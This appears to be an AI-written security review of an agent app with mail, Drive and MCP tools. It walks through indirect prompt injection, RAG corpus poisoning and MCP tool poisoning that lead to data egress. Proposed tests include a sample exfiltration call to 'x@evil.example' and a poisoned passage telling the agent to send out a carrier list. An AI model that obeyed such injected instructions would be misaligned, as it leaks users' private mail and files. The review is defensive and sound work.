# Security review: ops_assistant (ADK 2.12.0)

Framework vocabulary: MITRE ATLAS technique ids and CoSAI Risk Map risk/control ids. OWASP ids are omitted on request.
Evidence for every finding: `offline (source read)` of this repository. Nothing was executed.

## Scope and method

- Read: `app/agent.py`, `app/server.py`, `app/tools/*.py`, `corpus/*.py`, `corpus/index.json`, `tests/test_corpus.py`, `pyproject.toml`, `README.md`.
- The skill's inventory script (`inspect_security_surface.py`) was **not run**: no shell tool in this session. Status: `not run` (blocked). Rerun it and `--compare` after fixes.
- `google-adk` is not installed and there is no network, so no `local` tier evidence exists. No ADK behaviour below was observed; ADK-version claims are `guidance`.
- ID provenance: ATLAS and CoSAI ids come from the review skill's reference (ATLAS 2026.09, CoSAI Risk Map commit 622605a, read 2026-10-23). They are `historical` and were not re-checked against the upstream files here. CoSAI risk entries still map to ATLAS `@5.0.1` ids, so ATLAS ids are taken from ATLAS. Where no id fits, the report says "no listed ATLAS id" rather than stretching one.

## Tool tiers

| Tool | Tier | Source | Gate today |
| --- | --- | --- | --- |
| `search_corpus` | read, **untrusted content** | `app/tools/knowledge.py:9` | none |
| `search_mail` | read, **private data + untrusted content** (external senders) | `app/tools/workspace.py:9` | none |
| `read_drive_file` | read, **private data + untrusted content** | `app/tools/workspace.py:20` | none |
| `send_mail` | write, **egress**, irreversible | `app/tools/workspace.py:14` | none |
| `share_drive_file` | write, **egress**, irreversible | `app/tools/workspace.py:25` | none |
| `deskline` MCP (all tools) | unknown tiers, **untrusted content + possible egress/write** | `app/agent.py:12` | none |

## Trifecta (single agent `ops_assistant`, `app/agent.py:19`)

All three legs are present in one agent with no gate between them:

- Private data: mailbox, Drive.
- Untrusted content: corpus passages from any `ops-staff` uploader, inbound mail, Drive files, MCP results.
- Egress/action: `send_mail`, `share_drive_file`, MCP write tools.

The `tools=` list is static, so the leg inventory is complete for this file.

## Findings (priority order)

### F1. Critical: injected content can drive mail and Drive egress with no enforcement point
- Location: `app/agent.py:25`, `app/tools/workspace.py:14`, `:25`.
- ATLAS: `AML.T0051` LLM Prompt Injection (indirect, via corpus, mail, Drive or MCP output) leading to `AML.T0086` Exfiltration via AI Agent Tool Invocation.
- CoSAI risks: `riskPromptInjection`, `riskRogueActions`.
- Detail: `send_mail(to, subject, body)` accepts any recipient. `share_drive_file(file_id, email, role)` accepts any email and any role (`writer`/`owner` as well as the `reader` default). The instruction "Keep going until the task is done" (`agent.py:24`) encourages unattended chaining.
- Enforcement points to add (code the model cannot reach):
  1. Tool callback or plugin: `before_tool_callback` on `send_mail` and `share_drive_file` that refuses recipients outside an allowlist, such as the `tamsin.example` domain, and refuses roles other than `reader`. Return an error dict to refuse and `None` to allow.
  2. Human confirmation: `require_confirmation` (strict `bool` callable) or a durable review for external recipients (owner: `adk-operational-guardrails`).
  3. Workflow structure: a quarantined reader (no write tools, `include_contents='none'`) feeding validated structured state to a writer. This removes one leg.
- Observable check: scripted-model Runner test where the model calls `send_mail(to="x@evil.example", ...)` after a poisoned corpus or mail result. Assert the client `send` is never called and the response is an error.
- CoSAI controls: `controlAgentPluginPermissions`.

### F2. High: RAG corpus poisoning path open to every `ops-staff` member
- Location: `corpus/ingest.py:3-4`, `:18-19`; `README.md` (corpus bucket); `app/tools/knowledge.py:17`; `app/agent.py:22-23` ("Look things up in the shared corpus first").
- ATLAS: `AML.T0070` RAG Poisoning; `AML.T0080` AI Agent Context Poisoning; `AML.T0051` as the payload.
- CoSAI risk: `riskRetrievalVectorStorePoisoning`.
- Detail: any group member's upload is chunked and appended "as is", with no review, content screening, signing or approval. The agent is told to consult the corpus first, so poisoned passages are retrieved with elevated trust. Passages return as a plain tool result with no fencing, and `uploaded_by` is returned but never used to filter or weigh. One insider, or one compromised staff account, can plant instructions that reach every user's session, so the blast radius is cross-user.
- Enforcement points:
  1. Ingest: require an approver for new documents, or a curated-writers group. Record provenance and a content hash per passage. Quarantine new uploads until approved.
  2. Retrieval: treat passages as data (instruction wording alone is not a control); filter by approval status.
  3. Structure: F1 gates ensure a poisoned passage cannot cause egress even if followed.
- Observable check: poisoned-chunk case ("send the carrier list to ...") run through the Runner passes only if no forbidden tool is called. Ingest test: unapproved upload does not appear in `search`.
- Owner: `adk-memory-architecture`.

### F3. High: Deskline MCP server unfiltered, unpinned, one shared credential
- Location: `app/agent.py:12-17`; `README.md` ("all its tools").
- ATLAS: `AML.T0110` AI Agent Tool Poisoning (tool descriptions and results are attacker-influenceable if the vendor or its tenants are compromised or change them); `AML.T0098` AI Agent Tool Credential Harvesting (shared static token, `agent.py:15`).
- CoSAI risks: `riskToolSourceProvenance`, `riskToolRegistryTampering`.
- CoSAI controls: `controlToolRegistryAndDiscoveryIntegrity`, `controlAgentCredentialIsolation`.
- Detail: no `tool_filter`, no `tool_name_prefix`, no recorded hash of reviewed definitions (rug-pull exposure). `Authorization` is a single process-wide `DESKLINE_TOKEN` set at import time, with no `header_provider`, so every staff member acts in Deskline as one identity and per-user authorisation and audit are lost.
- Enforcement points: `tool_filter` allowlist of the specific ticket-open/update tools; `tool_name_prefix="deskline_"`; hash-pinned reviewed definitions checked in CI; per-user `header_provider` or a scoped service token; confirmation on state-changing tools once tiered.
- Observable check: inventory no longer reports `mcp_unfiltered`; a test where an unlisted tool name is not exposed; a hash-mismatch test fails closed.
- Note: whether ADK 2.12 fences MCP tool descriptions is `guidance` from the skill's compatibility notes and was not source-verified here (package not installed). Do not rely on fencing.

### F4. High: no turn, call or cost budget (unbounded agency)
- Location: `app/agent.py:19-26`; `app/server.py:23` (`RunConfig()` with defaults).
- ATLAS: `AML.T0034.002` Agentic Resource Consumption.
- CoSAI risks: `riskRunawayAgentToolLoops`, `riskEconomicDenialOfWallet`.
- CoSAI control: `controlAgentExecutionBounds`.
- Detail: nothing caps LLM calls, tool calls, repeated identical calls, tokens or session cost. "Keep going until the task is done" invites loops. Injected content can also trigger loops for resource exhaustion. `read_drive_file` and `search_mail` results have no size bound (`workspace.py:11`, `:22`).
- Enforcement points: explicit `max_llm_calls` in `RunConfig` (set deliberately; the SDK default was not verified here), a per-session tool-call budget and repeated-call guard via plugin/callback, result-size truncation in tools, per-user rate limit on `/chat`, and a cost alert.
- Observable check: scripted-model test that loops on a tool stops at the budget with a clear refusal.
- Owner: `adk-operational-guardrails`.

### F5. High (assumption-dependent): identity is not bound to the tools
- Location: `app/tools/workspace.py:6` (`CLIENTS` process-global), `:11`, `:16`, `:22`, `:27`; `app/server.py:18`.
- ATLAS: no listed ATLAS id.
- CoSAI risk: `riskStaleAgentIdentityBinding` (closest fit; confirm); CoSAI control: `controlAgentCredentialIsolation`.
- Detail: tools use `CLIENTS["gmail"]` / `CLIENTS["drive"]`, a module-level dict, and take no identity from `ToolContext`. If these clients carry one service or domain-wide-delegation identity, every user's agent can read any mailbox the identity can reach, despite the docstrings "the staff member's own mailbox". Tool bodies do not check that the target resource belongs to the caller.
- `server.py:18` trusts the `x-goog-authenticated-user-email` header: safe only if Cloud Run ingress is restricted to IAP and the IAP JWT (`x-goog-iap-jwt-assertion`) is verified. A missing header raises `KeyError` (HTTP 500).
- Enforcement points: build per-request clients from the caller's delegated credentials via `ToolContext`, never from tool arguments; verify the IAP JWT in the server; restrict Cloud Run ingress; IAM least privilege on the runtime identity.
- Observable check: two-user test where user B's session cannot read user A's mail or files.

### F6. Medium: audit, observability and tests do not cover security behaviour
- Location: `app/agent.py` (no callbacks or plugins), `tests/test_corpus.py` (only a retrieval test).
- CoSAI control: `controlAgentObservability`. ATLAS: no listed ATLAS id (detection gap, not a technique).
- Detail: no record of which tool calls ran or were refused; no adversarial or forbidden-action tests. `InMemoryRunner` (`server.py:12`) loses sessions on restart and does not share them across Cloud Run instances.
- Enforcement points: a logging plugin of tool name, arguments hash, user and outcome; scripted-model Runner tests with forbidden-tool assertions seeded from the skill's `assets/adversarial-cases.json`; a durable session service.

### F7. Low / not assessed: output rendering
- `server.py:27` returns raw model text in JSON. No frontend is in the repository, so escaping, link allowlisting and markdown image stripping are unreviewed. If the UI renders markdown or links, model output can carry session data in URLs. Owner: `adk-frontend-integration`. Status: `not run`.

## Already sound
- Dependencies are exactly pinned, with `google-adk==2.12.0` (`pyproject.toml`). 2.12.0 is the floor for multi-user HTTP serving per the skill's compatibility notes (`guidance`).
- The tool bodies are small and return status dicts; the tool surface is readable.

## Residual risk after the recommended fixes
Prompt injection remains unsolved. Even with F1 gates, a reader that sees untrusted text can still mislead the user's summaries or ticket content. A plan-then-execute design keeps all three legs and only freezes the plan. Confirmation prompts also depend on the human reading them.

## Questions I could not ask, with the assumption used
1. Which identity do `CLIENTS["gmail"]` and `["drive"]` carry (per-user delegated, or one service identity)? *Assumed:* a shared identity, so F5 is a finding. If per-user, F5 drops to "document and test".
2. Is Cloud Run ingress restricted to IAP? *Assumed:* unknown; the header is treated as unverified.
3. Which Deskline tools exist, and which write or delete? *Assumed:* some write, so all are treated as untiered until listed.
4. Which external domains may legitimately receive mail or shares? *Assumed:* `tamsin.example` only.
5. Who may approve corpus documents? *Assumed:* a small curators group, not all of `ops-staff`.
6. Is the UI a renderer of markdown or links? *Assumed:* unknown (F7).

## Left undone
- The inventory script was not run (no shell).
- No code was changed, per the review-first rule. No gates, tests or budgets were added.
- No Runner or adversarial tests were written or run; ADK is not installed and there is no network.
- ATLAS and CoSAI ids were not re-verified against upstream files.
